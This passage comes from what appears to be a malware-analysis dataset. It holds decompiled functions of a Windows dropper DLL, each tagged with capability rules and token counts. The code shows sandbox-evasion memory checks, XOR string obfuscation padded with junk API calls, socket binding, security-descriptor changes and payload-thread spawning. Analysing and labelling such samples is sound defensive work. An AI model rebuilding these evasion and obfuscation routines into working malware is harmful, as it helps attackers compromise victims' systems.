puStack1376 = 0x451e583f;\n        uStack1372 = 0x580c312a;\n        puStack1368 = 0x31364509;\n        uStack1364 = 0x4503581c;\n        uStack1360 = 0x58213137;\n        uStack1356 = 0x3128450d;\n        uStack1352 = 0x453f580a;\n        puStack1348 = 0x581d3131;\n        iStack1344 = 0x312b4505;\n        uStack1340 = 8;\n        uStack1339 = 0x6c58;\n        uStack1337 = 0x45;\n        uStack1384 = 0x456c586f;\n        uStack1380 = CONCAT22(uStack1380._2_2_, 0x3145);\n        (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        iVar11 = 0;\n        puStack1348 = &stack0xfffffa94 + -iVar8;\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n            if (iVar3 != 0x5488f3) {\n                *(iVar11 + iVar8) =\n                     (&stack0xfffffa8c)[iVar11 % iStack1344] ^ (iVar11 + iVar8)[&stack0xfffffa94 + -iVar8];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x28);\n        uStack1428 = 0;\n        uStack1432 = 0;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(uStack1228, iVar8);\n        piVar9 = &stack0xfffffb90;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != uStack1356);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (piVar9 - &stack0xfffffb92 >> 1 != 0) {\n            iVar8 = 8;\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            iVar3 = 0;\n            puStack1368 = &stack0xfffffa70 + -iVar11;\n            do {\n                iVar7 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                if (iVar7 != 0xb976d2) {\n                    *(iVar3 + iVar11) =\n                         (&stack0xfffffa68)[iVar3 % uStack1380] ^ (iVar3 + iVar11)[&stack0xfffffa70 + -iVar11];\n                }\n                pcVar2 = _sym.imp.SHLWAPI.dll_StrStrIW;\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 10);\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffb84, iVar11);\n            while (pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap,  iVar3 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar3 = (*pcVar2)(&stack0xfffffb78, iVar11);\n            }\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(CONCAT31(uStack1251, uStack1255._3_1_));\n        uVar6 = (*pcVar5)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    }\n    if ((iStack1192 == 0) && (uStack1196 < 2100000000)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        lpString = \"<%d>: DROPPER_DLL.CPP:%d > MemoryDetectionRoutine : statex.ullTotalPhys ACHTUNG : %d\";\n    }\n    else {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        lpString = \"<%d>: DROPPER_DLL.CPP:%d > MemoryDetectionRoutine : statex.ullTotalPhys : %d\";\n    }\n    uStack1428 = 0x40641e;\n    fcn.00401f6b(lpString, uVar6);\n    while ((iStack1192 == 0 && (uStack1196 < 2100000000))) {\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    (*pcVar5)();\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)();\n    uStack1428 = 0x406479;\n    uStack1428 = (*pcVar5)();\n    uStack1432 = 0x40647c;\n    (*pcVar2)();\n    uStack1432 = CONCAT31(uStack1235, uStack1239._3_1_);\n    uVar6 = (*pcVar5)(0);\n    (*pcVar2)(uVar6);\n    return;\n}\n",
        "token_count": 3699
    },
    "004064b9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint32_t fcn.004064b9(void)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uchar *puStack476;\n    uint32_t uVar8;\n    uchar auStack408 [404];\n    \n    puStack476 = &stack0xfffffe68;\n    uVar7 = 0;\n    uStack480 = 0x202;\n    uStack484 = 0x4064da;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uStack488 = 1;\n    uVar2 = (*_sym.imp.WS2_32.dll_socket)(2);\n    if (uVar2 != 0xffffffff) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar7 = iVar3 + 2000U & 0xffff;\n        uVar2 = 0;\n        if (uVar7 < 64000) {\n            uVar8 = 0x4c09176a;\n            puStack476 = 0x6f623939;\n            do {\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar6 = 0;\n                uVar7 = uVar8;\n                do {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                    if (iVar5 != 0x80d261) {\n                        *(iVar6 + iVar3) = (&stack0xfffffe18)[iVar6 % 5] ^ (iVar6 + iVar3)[&stack0xfffffe20 + -iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 10);\n                (*_sym.imp.WS2_32.dll_inet_addr)(iVar3);\n                uVar1 = (*_sym.imp.WS2_32.dll_ntohs)(uVar7);\n                uVar8 = CONCAT22(uVar1, 2);\n                iVar6 = (*_sym.imp.WS2_32.dll_bind)(0x5a5e, &stack0xfffffe30, 0x10);\n                if (iVar6 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(0x5a5e);\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar7 = uVar7 + 1;\n                uVar2 = 0;\n            } while (uVar7 < 64000);\n        }\n    }\n    return uVar2 & 0xffff0000 | uVar7 & 0xffff;\n}\n",
        "token_count": 717
    },
    "0040660a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040660a(uint arg_8h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    char *pcVar11;\n    uchar *puVar12;\n    uint *puVar13;\n    uint var_35ch;\n    uint var_154h;\n    uint var_114h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    var_d0h = 0x208;\n    iVar4 = fcn.00405c8d();\n    if (iVar4 == 0) {\n        fcn.00405ecb();\n        fcn.00402233();\n    }\n    while (iVar4 = fcn.00402f4f(),  pcVar2 = _sym.imp.KERNEL32.dll_VirtualProtect,  iVar4 != 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x413300, 0x184, 0x40, &var_c0h);\n    if (iVar4 != 0) {\n        fcn.0040d29a();\n        (*pcVar2)(0x413300, 0x184, var_c0h, &var_c0h);\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x1e5, *0x413440);\n    fcn.00401f6b(\"<%d>: DROPPER_DLL.CPP:%d > ServiceEntryPointThread : StaticData.Vendor : %d\", uVar5);\n    iVar10 = 0;\n    puVar12 = 0x41dae0;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.00409d70();\n    puVar13 = &var_68h;\n    for (iVar4 = 0x1c; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    puVar13 = &var_cch;\n    for (iVar4 = 0xc; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    puVar12 = 0x41dac0;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    puVar13 = &var_35ch;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    iVar4 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_35ch, &var_d0h);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_38h = 6;\n    if (iVar4 != 0) {\n        var_28h = 0x39166d1f;\n        var_24h._0_1_ = 0;\n        var_24h._1_1_ = 0x52;\n        var_24h._2_1_ = 0x18;\n        stack0xffffffdb = 0x4390b6d;\n        stack0xffffffdf = 0x6d0752;\n        var_1ch._3_1_ = 0x39;\n        var_18h._0_1_ = 0x45;\n        var_18h._1_1_ = 0x52;\n        var_ch = 0x39456d4a;\n        var_8h._0_2_ = 0x5245;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        var_30h = &var_28h - iVar4;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar6 != 0x47094a) {\n                *(iVar10 + iVar4) = *(&var_ch + iVar10 % var_38h) ^ (iVar10 + iVar4)[var_30h];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 0x12);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar4, &var_35ch);\n        uVar5 = (*pcVar2)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    iVar10 = 0;\n    iVar4 = fcn.00401b0b();\n    var_74h = 5;\n    if (iVar4 != 0) {\n        if (2 < var_68h._1_1_) {\n            iVar4 = 0;\n            if (0 < var_68h._1_1_ - 2) {\n                do {\n                    *0x41dab8 = *0x41dab8 + (&var_5ch)[iVar4];\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < var_68h._1_1_ - 2);\n            }\n        }\n        *0x41dab8 = *0x41dab8 ^ 0x43103655;\n        iVar4 = fcn.00405d76();\n        if (iVar4 != 0) {\n            if (*0x41db5c < 6) {\n                var_bch = 0x33666229;\n                var_b8h = 0x1b24784f;\n                var_b4h = 0x76334c07;\n                var_b0h = 0x35756356;\n                var_ach = 0x1c451e33;\n                var_a8h = 0x743d3875;\n                var_a4h = 0x36096324;\n                var_a0h = 0x19560c4f;\n                var_9ch = 0x765c5e00;\n                var_98h = 0x34071756;\n                var_94h = 0x192a0c3d;\n                var_90h = 0x764f4c75;\n                var_8ch = 0x36667138;\n                var_88h = 0x1b24784f;\n                var_84h = 0x76334c07;\n                var_80h = 0x35756356;\n                var_7ch._0_2_ = 0x1e35;\n                var_7ch._2_1_ = 0x6d;\n                var_ch = 0x774e586d;\n                var_8h._0_2_ = 0x3774;\n                uVar5 = (*pcVar2)(8, 0x44);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n                var_4ch = 0;\n                var_30h = &var_bch - iVar4;\n                do {\n                    iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar6 != 0xbee8f) {\n                        *(iVar10 + iVar4) = *(&var_ch + iVar10 % var_38h) ^ (iVar10 + iVar4)[var_30h];\n                    }\n                    iVar10 = iVar10 + 1;\n                } while (iVar10 < 0x43);\n            }\n            else {\n                var_28h = 0x1b4e6211;\n                var_24h._0_1_ = 0x3b;\n                var_24h._1_1_ = 0x79;\n                var_24h._2_1_ = 99;\n                stack0xffffffdb = 0x794c0128;\n                stack0xffffffdf = 0x5e012a63;\n                var_1ch._3_1_ = 0x42;\n                var_ch = 0x56665842;\n                var_8h._0_2_ = CONCAT11(var_8h._1_1_, 0x77);\n                uVar5 = (*pcVar2)(8, 0x11);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n                var_4ch = 0;\n                var_30h = &var_28h - iVar4;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                    if (iVar6 != 0x6694f7) {\n                        *(iVar10 + iVar4) = *(&var_ch + iVar10 % var_74h) ^ (iVar10 + iVar4)[var_30h];\n                    }\n                    iVar10 = iVar10 + 1;\n                } while (iVar10 < 0x10);\n            }\n            var_cch = 0xc;\n            var_c4h = 0;\n            var_c8h = 0;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)(iVar4, 1, &var_c8h, 0);\n            uVar5 = (*pcVar2)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n    }\n    *0x41dacc = fcn.004064b9();\n    *0x41dacc = *0x41dacc & 0xffff;\n    var_24h._0_1_ = 0;\n    var_24h._1_1_ = 0x2b;\n    var_24h._2_1_ = 0x3c;\n    stack0xffffffdb = 0xd153a2e;\n    stack0xffffffdf = 0x25043d36;\n    var_1ch._3_1_ = 0x13;\n    var_18h._0_1_ = 0x17;\n    var_18h._1_1_ = 0x53;\n    var_ch = 0x71595365;\n    var_8h._0_2_ = 0x7649;\n    uVar5 = (*pcVar2)(8, 0xf);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar10 = 0;\n    var_4ch = iVar4;\n    var_30h = &var_24h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar6 != 0x74bc3a) {\n            *(iVar10 + iVar4) = *(&var_ch + iVar10 % var_38h) ^ (iVar10 + iVar4)[&var_24h - iVar4];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0xe);\n    var_24h._0_1_ = 5;\n    var_24h._1_1_ = 0x15;\n    stack0xffffffdb = 0xd170825;\n    stack0xffffffdf = 0x1b09250b;\n    var_1ch._3_1_ = 0x15;\n    var_18h._0_1_ = 9;\n    var_18h._1_1_ = 0x4b;\n    var_ch = 0x4b646176;\n    var_8h._0_2_ = CONCAT11(var_8h._1_1_, 0x6c);\n    var_24h._2_1_ = var_24h;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar10 = 0;\n    var_48h = &var_24h - iVar4;\n    var_30h = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar6 != 0xc8fa7) {\n            *(iVar10 + iVar4) = *(&var_ch + iVar10 % var_74h) ^ (iVar10 + iVar4)[&var_24h - iVar4];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0xe);\n    var_14h = 0x6b2a304b;\n    var_10h._0_2_ = 0x6e25;\n    var_70h = 0x4e75436e;\n    var_6ch._0_1_ = 0x41;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar4 = var_4ch;\n    iVar6 = 0;\n    var_2ch = &var_14h - iVar10;\n    var_ch = iVar10;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar7 != 0x991140) {\n            *(iVar6 + iVar10) = *(&var_70h + iVar6 % var_74h) ^ (iVar6 + iVar10)[var_2ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 6);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_114h, iVar10, iVar4, *0x413440);\n    *0x41db60 = fcn.0040d130();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *0x41dacc = 6000;\n    var_2ch = var_2ch & 0xff000000 | 0x6b305f;\n    var_14h = 0x506b547a;\n    var_10h._0_2_ = 0x6c74;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 4);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar10 = 0;\n    var_3ch = &var_2ch - iVar4;\n    var_70h = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar6 != 0x157769) {\n            *(iVar10 + iVar4) = *(&var_14h + iVar10 % var_38h) ^ (iVar10 + iVar4)[var_3ch];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 3);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_154h, iVar4, *0x41dacc);\n    var_14h = 0x36121f36;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x72);\n    var_44h = 0x53676d42;\n    var_40h._0_1_ = 0x72;\n    uVar5 = (*pcVar2)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar10 = 0;\n    var_2ch = &var_14h - iVar4;\n    var_48h = iVar4;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar6 != 0xa2cb36) {\n            *(iVar10 + iVar4) = *(&var_44h + iVar10 % var_74h) ^ (iVar10 + iVar4)[var_2ch];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 5);\n    stack0xffffffdb = stack0xffffffdb & 0xff | 0x1a201500;\n    stack0xffffffdf = 0x3c4b2929;\n    var_1ch._3_1_ = 0x2c;\n    var_18h._0_1_ = 0x10;\n    var_18h._1_1_ = 0x4d;\n    var_14h = 0x4d744563;\n    var_10h._0_2_ = 0x3946;\n    uVar5 = (*pcVar2)(8, 0xb);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar10 = 0;\n    var_44h = &var_20h - iVar4;\n    var_2ch = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar6 != 0x8742d5) {\n            *(iVar10 + iVar4) = *(&var_14h + iVar10 % var_38h) ^ (iVar10 + iVar4)[var_44h];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 10);\n    var_60h = 0x58075015;\n    var_5ch = 0x52173608;\n    var_58h = 0x2b0b450b;\n    var_54h = 0x441c540e;\n    var_50h = 0x311d2011;\n    stack0xffffffdf = stack0xffffffdf & 0xff | 0x6e317800;\n    var_1ch._3_1_ = 0x36;\n    var_18h._0_1_ = 0x78;\n    var_18h._1_1_ = 0x44;\n    uVar5 = (*pcVar2)(8, 0x15);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar10 = 0;\n    var_3ch = &var_60h - iVar4;\n    var_14h = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar6 != 0x8f8773) {\n            *(iVar10 + iVar4) = *(&var_1ch + iVar10 % var_38h) ^ (iVar10 + iVar4)[var_3ch];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x14);\n    var_64h = 0x2e1d5138;\n    var_60h = 0x1a7c073a;\n    var_5ch = 0x5e0f2139;\n    var_58h = 0x1e272523;\n    var_54h = 0x30391272;\n    var_50h = CONCAT31(var_50h._1_3_, 0x6a);\n    var_38h = 0x4a73306a;\n    var_34h._0_1_ = 0x55;\n    uVar5 = (*pcVar2)(8, 0x16);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar10 = 0;\n    var_44h = &var_64h - iVar4;\n    var_3ch = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar6 != 0x90f47b) {\n            *(iVar10 + iVar4) = *(&var_38h + iVar10 % var_74h) ^ (iVar10 + iVar4)[&var_64h - iVar4];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_30h, var_48h);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_2ch, &var_114h);\n    iVar10 = var_14h;\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_14h, 0x413444);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(iVar4, &var_154h);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)(0x41096c);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(uVar5);\n    pcVar11 = NULL;\n    if (iVar6 == 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        puVar13 = puVar9;\n        for (iVar4 = 0xc; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar13 = 0;\n            puVar13 = puVar13 + 1;\n        }\n        *puVar9 = 0x20;\n        *0x41db54 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CreateThread;\n        *0x41dae0 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040cf7e, puVar9, 0, 0);\n        *0x41dae4 = (*pcVar2)(0, 0, fcn.0040b73d, *0x41db48, 0, 0);\n        *0x41dae8 = (*pcVar2)(0, 0, fcn.0040fab1, puVar9, 0, 0);\n        uVar5 = (*pcVar2)(0, 0, fcn.0040577b, arg_8h, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n        iVar4 = var_3ch;\n    }\n    else {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(599);\n        fcn.00401f6b(\"<%d>: DROPPER_DLL.CPP:%d > ServiceEntryPointThread : detected body spawner host param. Loading node\"\n                     , uVar5);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n        pcVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        if (pcVar8 != NULL) {\n            (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, pcVar8, 0x104);\n            do {\n                cVar1 = *pcVar8;\n                if (cVar1 == '\\\\') {\n                    pcVar11 = pcVar8;\n                }\n                pcVar8 = pcVar8 + 1;\n            } while (cVar1 != '\\0');\n            (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(iVar10, pcVar11 + 1);\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x25e, iVar10);\n            fcn.00401f6b(\"<%d>: DROPPER_DLL.CPP:%d > ServiceEntryPointThread : szMainProcessOverride : %s\", uVar5);\n            fcn.0040fbd3();\n            pcVar2 = swi(3);\n            uVar5 = (*pcVar2)();\n            return uVar5;\n        }\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar3)(0, iVar10);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar3)(0, var_2ch);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_48h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_70h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_ch);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_30h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_4ch);\n    (*pcVar2)(uVar5);\n    return 0;\n}\n",
        "token_count": 6046
    },
    "004078f9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004078f9(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x3b2f1723;\n    var_20h = 0x27076358;\n    var_1ch._0_2_ = 0x343b;\n    var_18h = 0x574b634d;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x34);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0x86a4c2) {\n            var_4h = 5;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 5) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_3ch = 0x17143036;\n    var_38h = 0x25106726;\n    var_34h = 0x60212c0c;\n    var_30h = 0x2a17000b;\n    var_2ch = 0x2b164617;\n    var_28h._0_2_ = 0x590a;\n    var_18h = 0x59784464;\n    var_14h._0_2_ = 0x3452;\n    uVar1 = (*pcVar5)(8, 0x17);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xdb128) {\n            var_8h = 6;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 6) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 889
    },
    "00407a32": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
